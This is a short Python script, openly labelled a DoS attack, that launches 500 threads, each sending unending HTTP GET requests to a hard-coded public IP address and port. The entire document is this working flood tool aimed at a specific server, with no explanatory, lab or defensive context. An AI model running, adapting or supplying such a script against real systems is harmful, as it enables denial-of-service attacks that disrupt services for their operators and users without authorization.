import requests
import threading

url = "http://13.237.94.113:8007/"
thread_num=500


def task(person):
    i=0
    while True:
        print(f" [person {person}]Dos Attack {i}")
        response = requests.get(url)
        i=i+1

for person in range(thread_num):
    t= threading.Thread(target=task,args =[person])
    t.start()
